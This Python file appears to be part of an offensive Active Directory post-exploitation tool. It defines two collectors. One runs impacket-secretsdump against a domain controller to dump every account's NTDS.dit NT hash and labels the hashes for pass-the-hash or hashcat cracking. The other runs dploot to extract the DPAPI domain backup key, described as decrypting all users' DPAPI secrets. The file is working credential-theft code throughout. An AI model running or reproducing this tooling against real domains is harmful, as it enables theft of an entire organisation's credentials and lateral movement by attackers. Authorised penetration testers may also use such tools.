"""DC-only loot (needs DCSync/DA rights, fails gracefully otherwise):
  - NTDS.dit domain hashes      (impacket-secretsdump -just-dc-ntlm)
  - DPAPI domain backup key     (dploot backupkey) -> decrypts every user's DPAPI
Both only run against a DC (needs_ldap)."""
from __future__ import annotations

import re
from typing import List

from core.credential import Credential
from core.secret import Secret, Status
from core.tools import find_tool, run, strip_ansi
from .base import BaseCollector

NTDS_RE = re.compile(r"^([^:]+):(\d+):([0-9a-fA-F]{32}):([0-9a-fA-F]{32}):::")


class NtdsCollector(BaseCollector):
    name = "NTDS"
    description = "Full NTDS.dit domain hashes (needs DCSync/DA)"
    per_credential = False
    needs_ldap = True
    requires = ("secretsdump",)

    def collect_once(self, cred: Credential) -> List[Secret]:
        bin_ = find_tool("secretsdump")
        if not bin_:
            return []
        cmd = ([bin_, cred.secretsdump_target(self.host), "-just-dc-ntlm"]
               + cred.impacket_extra_args())
        res = run(cmd, timeout=self.timeout, raw_dir=self.raw_dir,
                  raw_name=self._raw_name(cred))
        found = []
        for line in strip_ansi(res.output).splitlines():
            m = NTDS_RE.match(line.strip())
            if m:
                user, _rid, _lm, nt = m.groups()
                found.append(Secret(self.host, "NTDS", user, nt, Status.HASH,
                                    secret_type="nthash",
                                    notes="domain hash; PtH or hashcat -m 1000"))
        return found


class BackupkeyCollector(BaseCollector):
    name = "BackupKey"
    description = "DPAPI domain backup key (needs DA) - decrypts all user DPAPI"
    per_credential = True
    needs_ldap = True
    requires = ("dploot",)

    def collect_with_cred(self, cred: Credential) -> List[Secret]:
        bin_ = find_tool("dploot")
        if not bin_:
            return []
        out_pvk = f"{self.raw_dir}/backupkey.pvk"
        cmd = ([bin_, "backupkey", "-t", self.host, "--outputfile", out_pvk]
               + cred.dploot_auth_args())
        res = run(cmd, timeout=self.timeout, raw_dir=self.raw_dir,
                  raw_name=self._raw_name(cred))
        low = strip_ansi(res.output).lower()
        if "written" in low or "saved" in low or ".pvk" in low:
            return [Secret(self.host, "BackupKey", "", out_pvk, Status.CLEARTEXT,
                           secret_type="pvk",
                           notes="use with dploot --pvk to decrypt ALL users' DPAPI")]
        return []
